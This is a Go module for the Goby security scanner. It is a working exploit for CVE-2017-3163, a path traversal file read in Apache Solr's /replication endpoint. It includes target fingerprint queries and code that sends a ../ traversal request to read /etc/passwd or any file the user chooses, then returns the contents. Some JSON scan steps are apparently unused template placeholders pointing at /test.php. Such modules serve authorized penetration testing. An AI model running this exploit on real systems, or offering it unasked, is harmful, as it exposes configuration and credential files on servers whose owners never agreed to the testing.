package exploits

import (
	"strings"
  "errors"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Apache Solr /replication File Read Vulnerability(CVE-2017-3163)",
    "Description": "<p>Solr is an open-source enterprise search platform for the Apache Lucene project. Its main functions include full-text search, hit marking, faceted search, dynamic clustering, database integration, and rich text processing.</p><p>When using the Index Replication feature, Apache Solr nodes can pull index files from a master/leader node using an HTTP API which accepts a file name. However, Solr before 5.5.4 and 6.x before 6.4.1 did not validate the file name, hence it was possible to craft a special request involving path traversal, leaving any file readable to the Solr server process exposed.</p>",
    "Product": "APACHE-Solr",
    "Homepage": "http://lucene.apache.org/solr/",
    "DisclosureDate": "2017-08-31",
    "PostTime": "2024-07-22",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "title=\"Solr Admin\" || body=\"SolrCore Initialization Failures\" || body=\"app_config.solr_path\" || banner=\"/solr/\" || header=\"/solr/\" || body=\"/common/js/minified/core.js\"",
    "GobyQuery": "title=\"Solr Admin\" || body=\"SolrCore Initialization Failures\" || body=\"app_config.solr_path\" || banner=\"/solr/\" || header=\"/solr/\" || body=\"/common/js/minified/core.js\"",
    "Level": "1",
    "Impact": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://issues.apache.org/jira/browse/SOLR-10031\">https://issues.apache.org/jira/browse/SOLR-10031</a></p>",
    "References": [
        "https://avd.aliyun.com/detail?id=AVD-2017-3163"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "passwd,Customize",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "/etc/passwd",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        "CVE-2017-3163"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.0",
    "Translation": {
        "CN": {
            "Name": "Apache Solr /replication 文件读取漏洞（CVE-2017-3163）",
            "Product": "APACHE-Solr",
            "Description": "<p>Solr是Apache Lucene项目的开源企业搜索平台。其主要功能包括全文检索、命中标示、分面搜索、动态聚类、数据库集成，以及富文本的处理。&nbsp;Solr是用Java编写、运行在Servlet容器（如Apache Tomcat或Jetty）的一个独立的全文搜索服务器。 Solr采用了Lucene Java搜索库为核心的全文索引和搜索，并具有类似REST的HTTP/XML和JSON的API。</p><p>Solr的ReplicationHandler类对输入数据数据处理不当，存在任意文件读取漏洞，涉及漏洞编号为CVE-2017-3163。<br></p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://issues.apache.org/jira/browse/SOLR-10031\">https://issues.apache.org/jira/browse/SOLR-10031</a><br></p>",
            "Impact": "<p>攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br><br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Apache Solr /replication File Read Vulnerability(CVE-2017-3163)",
            "Product": "APACHE-Solr",
            "Description": "<p>Solr is an open-source enterprise search platform for the Apache Lucene project. Its main functions include full-text search, hit marking, faceted search, dynamic clustering, database integration, and rich text processing.<br></p><p>When using the Index Replication feature, Apache Solr nodes can pull index files from a master/leader node using an HTTP API which accepts a file name. However, Solr before 5.5.4 and 6.x before 6.4.1 did not validate the file name, hence it was possible to craft a special request involving path traversal, leaving any file readable to the Solr server process exposed.<br></p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://issues.apache.org/jira/browse/SOLR-10031\">https://issues.apache.org/jira/browse/SOLR-10031</a><br></p>",
            "Impact": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10976"
}`

	postOrGet_sanchuawhidbwd83hu2hfbf382gf2y := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		respTxt := ""
		// 注意：返回值为（最终要返回的读取结果，错误）
		requestConfig := httpclient.NewGetRequestConfig("/solr/db/replication?command=filecontent&file=../../../../../../../../../../../../.."+fileUrl+"&wt=filestream&generation=1")
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		if resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig); err == nil {
			if resp.StatusCode == 200{
				respTxt = resp.RawBody
				return respTxt, nil
			}
		}
    // 错误输出
    err := errors.New("fail to read")
		return respTxt, err
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/solr/db/replication"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"/etc/passwd": "root",
			}
			// 函数继承
			uploadFileFunc := postOrGet_sanchuawhidbwd83hu2hfbf382gf2y
			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"passwd": {"/etc/passwd", "root"},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_sanchuawhidbwd83hu2hfbf382gf2y

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}
			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}
			expResult.Success = true
			expResult.Output = resp
			return expResult
		},
	))
}
